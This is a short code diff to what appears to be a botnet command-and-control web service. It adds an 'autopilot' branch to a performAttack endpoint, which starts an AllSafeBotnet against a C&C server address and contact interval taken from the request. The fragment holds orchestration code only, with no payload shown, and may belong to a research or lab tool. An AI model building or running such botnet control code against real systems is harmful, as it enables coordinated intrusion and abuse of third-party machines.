@@ -59,8 +59,13 @@ def performAttack():
     print(request.json)
     if 'attack' in request.json:
         if request.json['attack'] == 'begin':
-            print("inizio")
+            # print("inizio")
             # retrieving and polishing C&C server and prepare config file
+            if 'autopilot_start' in request.json:
+                allsafe = Botnet.AllSafeBotnet()
+                allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']),override=False)
+                return "OK", 200
+
             cc_server = prepareConfigFile(request.json)
             if '://' not in cc_server:
                 cc_server = 'http://' + cc_server
